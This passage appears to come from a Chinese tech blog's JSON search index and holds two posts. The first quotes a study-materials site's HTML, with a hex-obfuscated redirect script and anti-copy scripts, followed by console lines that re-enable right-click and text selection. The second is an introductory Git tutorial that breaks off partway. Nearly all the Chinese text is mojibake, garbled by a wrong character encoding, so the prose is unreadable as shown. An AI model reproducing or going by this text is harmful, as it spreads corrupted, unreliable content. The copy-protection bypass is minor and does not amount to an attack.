\"\\x77\\x77\\x77\\x2e\\x67\\x65\\x62\\x69\\x64\\x65\\x6d\\x65\\x6e\\x67\\x6d\\x69\\x61\\x6e\\x72\\x65\\x6e\\x2e\\x63\\x6f\\x6d\"; if (window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x6f\\x73\\x74\"] != str) { location[\"\\x68\\x72\\x65\\x66\"] = location[\"\\x68\\x72\\x65\\x66\"][\"\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\"](window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\"][\"\\x68\\x6f\\x73\\x74\"], str); } \u003c/script\u003e \u003cdiv id=\"header-top\" class=\"header-bar-wrap\"\u003e\u003c/div\u003e \u003cdiv id=\"page\" class=\"hfeed site\"\u003e \u003ca class=\"skip-link screen-reader-text\" href=\"#content\"\u003eSkip to content\u003c/a\u003e \u003cheader id=\"masthead\" class=\"site-header clearfix\" role=\"banner\"\u003e \u003cdiv class=\"header-main container clearfix\"\u003e \u003cdiv id=\"logo\" class=\"site-branding clearfix\"\u003e \u003cp class=\"site-title\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/\" rel=\"home\"\u003eéš”å£çš„èŒé¢äºº\u003c/a\u003e\u003c/p\u003e \u003cp class=\"site-description\"\u003eæœ€ä¸“ä¸šçš„å¤§å­¦èµ„æ–™åˆ†äº«å¹³å°\u003c/p\u003e \u003c/div\u003e \u003cdiv class=\"header-widgets clearfix\"\u003e\u003c/div\u003e \u003c/div\u003e \u003cdiv id=\"main-navigation-wrap\" class=\"primary-navigation-wrap\"\u003e \u003cnav id=\"main-navigation\" class=\"primary-navigation navigation container clearfix\" role=\"navigation\"\u003e \u003cul id=\"menu-menu-1\" class=\"main-navigation-menu\"\u003e \u003cli id=\"menu-item-2987\" class=\"menu-item menu-item-type-post_type menu-item-object-page menu-item-2987\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/question-and-answer\"\u003eå¸¸è§é—®é¢˜è§£ç­”\u003c/a\u003e\u003c/li\u003e \u003cli id=\"menu-item-2988\" class=\"menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/category/zhihuishu\"\u003eæ™ºæ…§æ ‘\u003c/a\u003e\u003c/li\u003e \u003cli id=\"menu-item-2989\" class=\"menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/category/eryadaanfufei\"\u003eå°”é›…\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e \u003c/nav\u003e \u003c/div\u003e \u003c/header\u003e \u003cdiv id=\"content\" class=\"site-content container clearfix\"\u003e \u003csection id=\"primary\" class=\"content-single content-area\"\u003e \u003cmain id=\"main\" class=\"site-main\" role=\"main\"\u003e \u003carticle id=\"post-198\" class=\"post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei\"\u003e \u003cheader class=\"entry-header\"\u003e \u003cdiv class=\"entry-meta\"\u003e\u003cspan class=\"meta-date\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/198.html\" title=\"ä¸‹åˆ10:02\" rel=\"bookmark\"\u003e\u003ctime class=\"entry-date published updated\" datetime=\"2019-03-20T22:02:27+00:00\"\u003e2019å¹´3æœˆ20æ—¥\u003c/time\u003e\u003c/a\u003e\u003c/span\u003e\u003cspan class=\"meta-author\"\u003e \u003cspan class=\"author vcard\"\u003e\u003ca class=\"url fn n\" href=\"http://www.gebidemengmianren.com/author/meng\" title=\"View all posts by gebilaowang\" rel=\"author\"\u003egebilaowang\u003c/a\u003e\u003c/span\u003e\u003c/span\u003e\u003c/div\u003e \u003ch1 class=\"entry-title\"\u003eå¯†ç ä¿æŠ¤ï¼šå½“ä»£ä¸­å›½æ”¿åºœä¸æ”¿æ²»2019\u003c/h1\u003e \u003c/header\u003e \u003cfooter class=\"entry-footer\"\u003e \u003cdiv class=\"entry-categories clearfix\"\u003e \u003cspan class=\"meta-categories\"\u003e \u003ca href=\"http://www.gebidemengmianren.com/category/eryadaanfufei\" rel=\"category tag\"\u003eå°”é›…\u003c/a\u003e \u003c/span\u003e\u003c/div\u003e \u003cnav class=\"navigation post-navigation\" role=\"navigation\"\u003e \u003ch2 class=\"screen-reader-text\"\u003eæ–‡ç« å¯¼èˆª\u003c/h2\u003e \u003cdiv class=\"nav-links\"\u003e \u003cdiv class=\"nav-previous\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/196.html\" rel=\"prev\"\u003e\u003cspan class=\"screen-reader-text\"\u003ePrevious Post:\u003c/span\u003eå½“ä»£ä¸­å›½ç»æµ2019ä¿®æ­£ç‰ˆ\u003c/a\u003e\u003c/div\u003e \u003cdiv class=\"nav-next\"\u003e\u003ca href=\"http://www.gebidemengmianren.com/eryadaanfufei/200.html\" rel=\"next\"\u003e\u003cspan class=\"screen-reader-text\"\u003eNext Post:\u003c/span\u003eå½“æ”¿åºœé‡ä¸Šäº’è”ç½‘2019\u003c/a\u003e\u003c/div\u003e \u003c/div\u003e \u003c/nav\u003e \u003c/footer\u003e \u003c/article\u003e \u003cdiv id=\"comments\" class=\"comments-area\"\u003e\u003c/div\u003e \u003c/main\u003e \u003c/section\u003e \u003csection id=\"secondary\" class=\"sidebar widget-area clearfix sidebar-my-flag\" role=\"complementary\"\u003e \u003caside id=\"search-6\" class=\"widget widget_search clearfix\"\u003e \u003cform role=\"search\" method=\"get\" class=\"search-form\" action=\"http://www.gebidemengmianren.com/\"\u003e \u003clabel\u003e \u003cspan class=\"screen-reader-text\"\u003eSearch for:\u003c/span\u003e \u003cinput type=\"search\" class=\"search-field\" placeholder=\"æœç´¢ \u0026hellip;\" value=\"\" name=\"s\" title=\"Search for:\" /\u003e \u003c/label\u003e \u003cbutton type=\"submit\" class=\"search-submit\"\u003e \u003cspan class=\"genericon-search\"\u003e\u003c/span\u003e \u003cspan class=\"screen-reader-text\"\u003eSearch\u003c/span\u003e \u003c/button\u003e\u003c/form\u003e \u003c/aside\u003e \u003c/section\u003e \u003c/div\u003e \u003ca href=\"http://www.gebidemengmianren.com/question-and-answer\" target=\"_blank\"\u003e \u003cdiv class=\"livechat-girl animated\"\u003e \u003cimg class=\"girl\" src=\"http://www.gebidemengmianren.com/kefu/images/en_3.png\"\u003e \u003cdiv class=\"livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint\"\u003e \u003cdiv class=\"rd-notice-content\"\u003e æˆ‘æ¥å¸®æ‚¨ï¼\u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"animated-circles\"\u003e \u003cdiv class=\"circle c-1\"\u003e\u003c/div\u003e \u003cdiv class=\"circle c-2\"\u003e\u003c/div\u003e \u003cdiv class=\"circle c-3\"\u003e\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/a\u003e \u003clink href=\"http://www.xuexianswer.com/kefu/css/css.css\" rel=\"stylesheet\" media=\"screen\"\u003e \u003cscript type=\"text/javascript\" src=\"http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"http://www.xuexianswer.com/kefu/js/kefu.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"http://www.gebidemengmianren.com/kefu/js/en_3.js\"\u003e\u003c/script\u003e \u003cdiv id=\"footer\" class=\"footer-wrap\"\u003e \u003cfooter id=\"colophon\" class=\"site-footer container clearfix\" role=\"contentinfo\"\u003e \u003cdiv align=\"center\"\u003e \u003ca href=\"http://www.gebidemengmianren.com/\" style='text-decoration:none; color:#939393;'\u003e\u0026copy;éš”å£çš„èŒé¢äºº\u003c/a\u003e \u003c/br\u003e \u003ca href=\"http://www.beian.miit.gov.cn/\" style='text-decoration:none;color:#939393;'\u003eæ¸ICPå¤‡17014860å·-2\u003c/a\u003e \u003c/br\u003e \u003ca target=\"_blank\" href=\"\" style=\"display:inline-block;text-decoration:none;height:20px;line-height:20px;\"\u003e\u003cimg src=\"http://www.xuexianswer.com/beian/logo.png\" style=\"float:left;\" /\u003e \u003cp style=\"float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;\"\u003eæ¸å…¬ç½‘å®‰å¤‡ 50011402500333å·\u003c/p\u003e \u003c/a\u003e \u003cbr\u003e \u003cspan align=\"right\" style=\"display:inline-block;float:right;color:#303030;text-decoration:none;\"\u003eå‹æƒ…é“¾æ¥ï¼š \u003ca href=\"http://www.xuexianswer.com/\" style=\"color:#303030;text-decoration:none;\"\u003eèŒé¢äººèµ„æ–™é“º\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://www.mengmianren.com/\" style=\"color:#303030;text-decoration:none;\"\u003eèŒé¢äººç½‘\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://mengmianren.cc/\" style=\"color:#303030;text-decoration:none;\"\u003eèŒé¢äººCCç½‘\u003c/a\u003e\u0026nbsp; \u003ca href=\"http://mengmianren.pro/\" style=\"color:#303030;text-decoration:none;\"\u003eèŒé¢äººPROç½‘\u003c/a\u003e \u003c/span\u003e\u003c/div\u003e \u003c/footer\u003e \u003c/div\u003e \u003c/div\u003e \u003cmeta http-equiv=\"imagetoolbar\" content=\"no\"\u003e \u003cscript type=\"text/javascript\"\u003e document.oncontextmenu = function() { return false; }; document.onselectstart = function() { if (event.srcElement.type != \"text\" \u0026\u0026 event.srcElement.type != \"textarea\" \u0026\u0026 event.srcElement.type != \"password\") { return false; } else { return true; } }; if (window.sidebar) { document.onmousedown = function(e) { var obj = e.target; if (obj.tagName.toUpperCase() == 'SELECT' || obj.tagName.toUpperCase() == \"INPUT\" || obj.tagName.toUpperCase() == \"TEXTAREA\" || obj.tagName.toUpperCase() == \"PASSWORD\") { return true; } else { return false; } }; } document.ondragstart = function() { return false; }; \u003c/script\u003e \u003cscript type='text/javascript'\u003e var pvcArgsFrontend = { \"mode\": \"ajax\", \"requestURL\": \"http:\\/\\/www.gebidemengmianren.com\\/wp-content\\/plugins\\/post-views-counter\\/includes\\/ajax.php\", \"postID\": \"198\", \"nonce\": \"8b28046242\" }; \u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'\u003e\u003c/script\u003e \u003cscript type='text/javascript' src='http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e     ç ´è§£æ–¹æ³•   æŸ¥çœ‹æºç çš„ä¸€ä¸ªç®€å•æ–¹æ³•ï¼š\nåœ¨æµè§ˆå™¨çš„åœ°å€æ è¾“å…¥ä»¥ä¸‹ä¸œè¥¿ï¼Œå³å¯æŸ¥çœ‹æºç \nview-source:url å‡å¦‚æ˜¯é€šè¿‡jsç¦ç”¨çš„è¯ï¼Œå¯ä»¥åœ¨æ§åˆ¶å°ä¸‹è¾“å…¥\n1 2 3 4  document.body.oncontextmenu=\"return true\"; //å³é”®èœå• document.body.onselectstart=\"return true\"; //æ–‡æœ¬é€‰æ‹©   ","description":"","tags":["web","javascript"],"title":"js_banned","uri":"/posts/js_banned/"},{"categories":["tech"],"content":"Git  å¼•ç”¨ï¼š\nGitè¯¦ç»†ä½¿ç”¨æ•™ç¨‹\nGitæ•™ç¨‹\nGitæœ¬åœ°æœåŠ¡å™¨æ­å»ºåŠä½¿ç”¨æ–¹æ³•\nGitåŸç†å…¥é—¨è§£æ\nä½¿ç”¨åŸç†è§†è§’çœ‹Git\ngitæµç¨‹å¯è§†åŒ–å›¾ï¼šhttps://zhuanlan.zhihu.com/p/132573100\n   Git çš„è¯ç”Ÿï¼š\nå¾ˆå¤šäººéƒ½çŸ¥é“ï¼ŒLinus åœ¨ 1991 å¹´åˆ›å»ºäº†å¼€æºçš„ Linuxï¼Œä»æ­¤ï¼ŒLinux ç³»ç»Ÿä¸æ–­å‘å±•ï¼Œå·²ç»æˆä¸ºæœ€å¤§çš„æœåŠ¡å™¨ç³»ç»Ÿè½¯ä»¶äº†ã€‚\nLinus è™½ç„¶åˆ›å»ºäº† Linuxï¼Œä½† Linux çš„å£®å¤§æ˜¯é å…¨ä¸–ç•Œçƒ­å¿ƒçš„å¿—æ„¿è€…å‚ä¸çš„ï¼Œè¿™ä¹ˆå¤šäººåœ¨ä¸–ç•Œå„åœ°ä¸º Linux ç¼–å†™ä»£ç ï¼Œé‚£ Linux çš„ä»£ç æ˜¯å¦‚ä½•ç®¡ç†çš„å‘¢ï¼Ÿ\näº‹å®æ˜¯ï¼Œåœ¨ 2002 å¹´ä»¥å‰ï¼Œä¸–ç•Œå„åœ°çš„å¿—æ„¿è€…æŠŠæºä»£ç æ–‡ä»¶é€šè¿‡ diff çš„æ–¹å¼å‘ç»™ Linusï¼Œç„¶åç”± Linus æœ¬äººé€šè¿‡æ‰‹å·¥æ–¹å¼åˆå¹¶ä»£ç ï¼\nä½ ä¹Ÿè®¸ä¼šæƒ³ï¼Œä¸ºä»€ä¹ˆ Linus ä¸æŠŠ Linux ä»£ç æ”¾åˆ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé‡Œå‘¢ï¼Ÿä¸æ˜¯æœ‰ CVSã€SVN è¿™äº›å…è´¹çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿå—ï¼Ÿå› ä¸º Linus åšå®šåœ°åå¯¹ CVS å’Œ SVNï¼Œè¿™äº›é›†ä¸­å¼çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸ä½†é€Ÿåº¦æ…¢ï¼Œè€Œä¸”å¿…é¡»è”ç½‘æ‰èƒ½ä½¿ç”¨ã€‚æœ‰ä¸€äº›å•†ç”¨çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œè™½ç„¶æ¯” CVSã€SVN å¥½ç”¨ï¼Œä½†é‚£æ˜¯ä»˜è´¹çš„ï¼Œå’Œ Linux çš„å¼€æºç²¾ç¥ä¸ç¬¦ã€‚\nä¸è¿‡ï¼Œåˆ°äº† 2002 å¹´ï¼ŒLinux ç³»ç»Ÿå·²ç»å‘å±•äº†åå¹´äº†ï¼Œä»£ç åº“ä¹‹å¤§è®© Linus å¾ˆéš¾ç»§ç»­é€šè¿‡æ‰‹å·¥æ–¹å¼ç®¡ç†äº†ï¼Œç¤¾åŒºçš„å¼Ÿå…„ä»¬ä¹Ÿå¯¹è¿™ç§æ–¹å¼è¡¨è¾¾äº†å¼ºçƒˆä¸æ»¡ï¼Œäºæ˜¯ Linus é€‰æ‹©äº†ä¸€ä¸ªå•†ä¸šçš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ BitKeeperï¼ŒBitKeeper çš„ä¸œå®¶ BitMover å…¬å¸å‡ºäºäººé“ä¸»ä¹‰ç²¾ç¥ï¼Œæˆæƒ Linux ç¤¾åŒºå…è´¹ä½¿ç”¨è¿™ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚\nå®‰å®šå›¢ç»“çš„å¤§å¥½å±€é¢åœ¨ 2005 å¹´å°±è¢«æ‰“ç ´äº†ï¼ŒåŸå› æ˜¯ Linux ç¤¾åŒºç‰›äººèšé›†ï¼Œä¸å…æ²¾æŸ“äº†ä¸€äº›æ¢å±±å¥½æ±‰çš„æ±Ÿæ¹–ä¹ æ°”ã€‚å¼€å‘ Samba çš„ Andrew è¯•å›¾ç ´è§£ BitKeeper çš„åè®®ï¼ˆè¿™ä¹ˆå¹²çš„å…¶å®ä¹Ÿä¸åªä»–ä¸€ä¸ªï¼‰ï¼Œè¢« BitMover å…¬å¸å‘ç°äº†ï¼ˆç›‘æ§å·¥ä½œåšå¾—ä¸é”™ï¼ï¼‰ï¼Œäºæ˜¯ BitMover å…¬å¸æ€’äº†ï¼Œè¦æ”¶å› Linux ç¤¾åŒºçš„å…è´¹ä½¿ç”¨æƒã€‚\nLinus å¯ä»¥å‘ BitMover å…¬å¸é“ä¸ªæ­‰ï¼Œä¿è¯ä»¥åä¸¥æ ¼ç®¡æ•™å¼Ÿå…„ä»¬ï¼Œå—¯ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚å®é™…æƒ…å†µæ˜¯ï¼šLinus èŠ±äº†ä¸¤å‘¨æ—¶é—´è‡ªå·±ç”¨ C å†™äº†ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œè¿™å°±æ˜¯ Gitï¼ä¸€ä¸ªæœˆä¹‹å†…ï¼ŒLinux ç³»ç»Ÿçš„æºç å·²ç»ç”± Git ç®¡ç†äº†ï¼ç‰›æ˜¯æ€ä¹ˆå®šä¹‰çš„å‘¢ï¼Ÿå¤§å®¶å¯ä»¥ä½“ä¼šä¸€ä¸‹ã€‚\nGit è¿…é€Ÿæˆä¸ºæœ€æµè¡Œçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå°¤å…¶æ˜¯ 2008 å¹´ï¼ŒGitHub ç½‘ç«™ä¸Šçº¿äº†ï¼Œå®ƒä¸ºå¼€æºé¡¹ç›®å…è´¹æä¾› Git å­˜å‚¨ï¼Œæ— æ•°å¼€æºé¡¹ç›®å¼€å§‹è¿ç§»è‡³ GitHubï¼ŒåŒ…æ‹¬ jQueryï¼ŒPHPï¼ŒRuby ç­‰ç­‰ã€‚\nå†å²å°±æ˜¯è¿™ä¹ˆå¶ç„¶ï¼Œå¦‚æœä¸æ˜¯å½“å¹´ BitMover å…¬å¸å¨èƒ Linux ç¤¾åŒºï¼Œå¯èƒ½ç°åœ¨æˆ‘ä»¬å°±æ²¡æœ‰å…è´¹è€Œè¶…çº§å¥½ç”¨çš„ Git äº†ã€‚\n Gitæ˜¯ä»€ä¹ˆ Gitæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç”¨äºæ•æ·é«˜æ•ˆåœ°å¤„ç†ä»»ä½•æˆ–å°æˆ–å¤§çš„é¡¹ç›®ã€‚ Gitæ˜¯ Linus Torvalds ä¸ºäº†å¸®åŠ©ç®¡ç† Linux å†…æ ¸å¼€å‘è€Œå¼€å‘çš„ä¸€ä¸ªå¼€æ”¾æºç çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ã€‚ Gitä¸å¸¸ç”¨çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…· CVS, Subversion ç­‰ä¸åŒï¼Œå®ƒé‡‡ç”¨äº†åˆ†å¸ƒå¼ç‰ˆæœ¬åº“çš„æ–¹å¼ï¼Œä¸å¿…æœåŠ¡å™¨ç«¯è½¯ä»¶æ”¯æŒã€‚\nå…ˆè¯´é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç‰ˆæœ¬åº“æ˜¯é›†ä¸­å­˜æ”¾åœ¨ä¸­å¤®æœåŠ¡å™¨çš„ï¼Œè€Œå¹²æ´»çš„æ—¶å€™ï¼Œç”¨çš„éƒ½æ˜¯è‡ªå·±çš„ç”µè„‘ï¼Œæ‰€ä»¥è¦å…ˆä»ä¸­å¤®æœåŠ¡å™¨å–å¾—æœ€æ–°çš„ç‰ˆæœ¬ï¼Œç„¶åå¼€å§‹å¹²æ´»ï¼Œå¹²å®Œæ´»äº†ï¼Œå†æŠŠè‡ªå·±çš„æ´»æ¨é€ç»™ä¸­å¤®æœåŠ¡å™¨ã€‚ä¸­å¤®æœåŠ¡å™¨å°±å¥½æ¯”æ˜¯ä¸€ä¸ªå›¾ä¹¦é¦†ï¼Œä½ è¦æ”¹ä¸€æœ¬ä¹¦ï¼Œå¿…é¡»å…ˆä»å›¾ä¹¦é¦†å€Ÿå‡ºæ¥ï¼Œç„¶åå›åˆ°å®¶è‡ªå·±æ”¹ï¼Œæ”¹å®Œäº†ï¼Œå†æ”¾å›å›¾ä¹¦é¦†ã€‚\né‚£åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæœ‰ä½•ä¸åŒå‘¢ï¼Ÿé¦–å…ˆï¼Œ**åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ ¹æœ¬æ²¡æœ‰ â€œä¸­å¤®æœåŠ¡å™¨â€ï¼Œæ¯ä¸ªäººçš„ç”µè„‘ä¸Šéƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“ï¼Œ**è¿™æ ·ï¼Œä½ å·¥ä½œçš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦è”ç½‘äº†ï¼Œå› ä¸ºç‰ˆæœ¬åº“å°±åœ¨ä½ è‡ªå·±çš„ç”µè„‘ä¸Šã€‚æ—¢ç„¶æ¯ä¸ªäººç”µè„‘ä¸Šéƒ½æœ‰ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“ï¼Œé‚£å¤šä¸ªäººå¦‚ä½•åä½œå‘¢ï¼Ÿæ¯”æ–¹è¯´ä½ åœ¨è‡ªå·±ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶ Aï¼Œä½ çš„åŒäº‹ä¹Ÿåœ¨ä»–çš„ç”µè„‘ä¸Šæ”¹äº†æ–‡ä»¶ Aï¼Œè¿™æ—¶ï¼Œä½ ä»¬ä¿©ä¹‹é—´åªéœ€æŠŠå„è‡ªçš„ä¿®æ”¹æ¨é€ç»™å¯¹æ–¹ï¼Œå°±å¯ä»¥äº’ç›¸çœ‹åˆ°å¯¹æ–¹çš„ä¿®æ”¹äº†ã€‚é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæœ€å¤§çš„æ¯›ç—…å°±æ˜¯å¿…é¡»è”ç½‘æ‰èƒ½å·¥ä½œã€‚\n Gitä¸SVNçš„åŒºåˆ« GITä¸ä»…ä»…æ˜¯ä¸ªç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿæ˜¯ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿ(CMS),å·¥ä½œç®¡ç†ç³»ç»Ÿç­‰ã€‚ Git ä¸ SVN åŒºåˆ«ç‚¹ï¼š\n GITæ˜¯åˆ†å¸ƒå¼çš„ï¼ŒSVNä¸æ˜¯ï¼šè¿™æ˜¯GITå’Œå…¶å®ƒéåˆ†å¸ƒå¼çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä¾‹å¦‚SVNï¼ŒCVSç­‰ï¼Œæœ€æ ¸å¿ƒçš„åŒºåˆ«ã€‚ 2.GITæŠŠå†…å®¹æŒ‰å…ƒæ•°æ®æ–¹å¼å­˜å‚¨ï¼Œè€ŒSVNæ˜¯æŒ‰æ–‡ä»¶ï¼šæ‰€æœ‰çš„èµ„æºæ§åˆ¶ç³»ç»Ÿéƒ½æ˜¯æŠŠæ–‡ä»¶çš„å…ƒä¿¡æ¯éšè—åœ¨ä¸€ä¸ªç±»ä¼¼.svn,.cvsç­‰çš„æ–‡ä»¶å¤¹é‡Œã€‚ GITåˆ†æ”¯å’ŒSVNçš„åˆ†æ”¯ä¸åŒï¼šåˆ†æ”¯åœ¨SVNä¸­ä¸€ç‚¹ä¸ç‰¹åˆ«ï¼Œå°±æ˜¯ç‰ˆæœ¬åº“ä¸­çš„å¦å¤–çš„ä¸€ä¸ªç›®å½•ã€‚ GITæ²¡æœ‰ä¸€ä¸ªå…¨å±€çš„ç‰ˆæœ¬å·ï¼Œè€ŒSVNæœ‰ï¼šç›®å‰ä¸ºæ­¢è¿™æ˜¯è·ŸSVNç›¸æ¯”GITç¼ºå°‘çš„æœ€å¤§çš„ä¸€ä¸ªç‰¹å¾ã€‚ GITçš„å†…å®¹å®Œæ•´æ€§è¦ä¼˜äºSVNï¼šGITçš„å†…å®¹å­˜å‚¨ä½¿ç”¨çš„æ˜¯SHA-1å“ˆå¸Œç®—æ³•ã€‚è¿™èƒ½ç¡®ä¿ä»£ç å†…å®¹çš„å®Œæ•´æ€§ï¼Œç¡®ä¿åœ¨é‡åˆ°ç£ç›˜æ•…éšœå’Œç½‘ç»œé—®é¢˜æ—¶é™ä½å¯¹ç‰ˆæœ¬åº“çš„ç ´åã€‚   GitåŸç† è¯¦ç»†å›¾æ–‡è§£é‡Šå¯å‚è€ƒæ­¤ç¯‡æ–‡ç« ä½¿ç”¨åŸç†è§†è§’çœ‹Gitï¼Œé‡Œé¢è¯¦ç»†ç”¨å›¾æ–‡è§£é‡Šäº†gitçš„ç‰ˆæœ¬æ§åˆ¶åŸç†\ngitçš„å·¥ä½œæµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š\n å…‹éš† Git èµ„æºä½œä¸ºå·¥ä½œç›®å½•ã€‚ åœ¨å…‹éš†çš„èµ„æºä¸Šæ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶ã€‚ å¦‚æœå…¶ä»–äººä¿®æ”¹äº†ï¼Œä½ å¯ä»¥æ›´æ–°èµ„æºã€‚ åœ¨æäº¤å‰æŸ¥çœ‹ä¿®æ”¹ã€‚ æäº¤ä¿®æ”¹ã€‚ åœ¨ä¿®æ”¹å®Œæˆåï¼Œå¦‚æœå‘ç°é”™è¯¯ï¼Œå¯ä»¥æ’¤å›æäº¤å¹¶å†æ¬¡ä¿®æ”¹å¹¶æäº¤ã€‚  åŸºæœ¬æ¦‚å¿µ æˆ‘ä»¬å…ˆæ¥ç†è§£ä¸‹Git å·¥ä½œåŒºã€æš‚å­˜åŒºå’Œç‰ˆæœ¬åº“æ¦‚å¿µ\n  å·¥ä½œåŒºï¼šå°±æ˜¯ä½ é¡¹ç›®çš„ç›®å½•ï¼ˆå¯è§ç›®å½•ï¼‰ã€‚\n  ç¼“å­˜åŒºï¼šè‹±æ–‡å«stage, æˆ–indexã€‚ä¸€èˆ¬å­˜æ”¾åœ¨â€gitç›®å½•â€ä¸‹çš„indexæ–‡ä»¶ï¼ˆ.git/indexï¼‰ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæš‚å­˜åŒºæœ‰æ—¶ä¹Ÿå«ä½œç´¢å¼•ï¼ˆindexï¼‰ã€‚\n  ç‰ˆæœ¬åº“ï¼šå·¥ä½œåŒºæœ‰ä¸€ä¸ªéšè—ç›®å½•.gitï¼Œè¿™ä¸ªä¸ç®—å·¥ä½œåŒºï¼Œè€Œæ˜¯Gitçš„ç‰ˆæœ¬åº“ã€‚\n  ä¸‹é¢è¿™ä¸ªå›¾å±•ç¤ºäº†å·¥ä½œåŒºã€ç‰ˆæœ¬åº“ä¸­çš„æš‚å­˜åŒºå’Œç‰ˆæœ¬åº“ä¹‹é—´çš„å…³ç³»ï¼š\nå¦‚æœæˆ‘ä»¬è¦å¯¹é¡¹ç›®è¿›è¡Œç®¡ç†ï¼Œå°±åˆ‡æ¢åˆ°è¯¥é¡¹ç›®ç›®å½•åº•ä¸‹ï¼Œä½¿ç”¨git initå‘½ä»¤ï¼Œè¿›è¡Œåˆå§‹åŒ–\n1  $git init   git init å‘½ä»¤åªä¼šåšä¸€ä»¶äº‹ï¼Œå°±æ˜¯åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª .git çš„å­ç›®å½•ï¼Œç”¨æ¥ä¿å­˜å½“å‰é¡¹ç›®çš„ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨ tree -a å‘½ä»¤æŸ¥çœ‹è¯¥ç›®å½•çš„å®Œæ•´ç»“æ„ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  $tree -a . â””â”€â”€ .git â”œâ”€â”€ HEAD â”œâ”€â”€ branches â”œâ”€â”€ config â”œâ”€â”€ description â”œâ”€â”€ hooks â”‚ â”œâ”€â”€ applypatch-msg.sample â”‚ â”œâ”€â”€ commit-msg.sample â”‚ â”œâ”€â”€ fsmonitor-watchman.sample â”‚ â”œâ”€â”€ post-update.sample â”‚ â”œâ”€â”€ pre-applypatch.sample â”‚ â”œâ”€â”€ pre-commit.sample â”‚ â”œâ”€â”€ pre-push.sample â”‚ â”œâ”€â”€ pre-rebase.sample â”‚ â”œâ”€â”€ pre-receive.sample â”‚ â”œâ”€â”€ prepare-commit-msg.sample â”‚ â””â”€â”€ update.sample â”œâ”€â”€ index â”œâ”€â”€ info â”‚ â””â”€â”€ exclude â”œâ”€â”€ objects â”‚ â”œâ”€â”€ .DS_Store â”‚ â”œâ”€â”€ info â”‚ â””â”€â”€ pack â””â”€â”€ refs â”œâ”€â”€ heads â””â”€â”€ tags   Gitç›®å½•è§£æ config ç›®å½• config 